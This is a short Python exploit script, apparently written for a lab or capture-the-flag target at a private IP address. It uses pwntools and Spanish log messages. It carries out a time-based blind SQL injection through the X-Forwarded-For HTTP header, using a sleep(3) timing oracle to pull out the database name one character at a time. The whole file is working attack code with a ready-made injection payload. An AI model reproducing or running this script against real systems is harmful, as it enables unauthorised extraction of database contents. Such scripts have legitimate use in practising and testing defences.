#!/usr/bin/python3

from pwn import *
import requests, time, signal

# VARIABLES
url_main = "http://192.168.0.100"
chars = r"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
resultado = ""

def def_handler(sig, frame):
    log.failure("Saliendo")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def check(payload):
    headers = {
        "Host" : "192.168.0.100",
        "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language" : "en-US,en;q=0.5",
        "Accept-Encoding" : "gzip, deflate",
        "Connection" : "close",
        "Upgrade-Insecure-Requests" : "1",
        "X-Forwarded-For" : "%s" % payload
    }
    begin = time.time()
    content = requests.get(url_main, headers=headers)
    end = time.time()

    if (end - begin) > 3:
        return True

p1=log.progress('Base de datos')
p2=log.progress('Payload')

for i in range(1,20):
    for c in chars:
        payload = "test' or IF(SUBSTR(database(),%d,1)=BINARY(0x%s),sleep(3),1)-- -" % (i,c.encode("utf-8").hex())
        p2.status("%s" % payload)

        if check(payload):
            resultado += c
            p1.status("%s" % resultado)
            break

log.info("Base de datos: %s" %resultado)
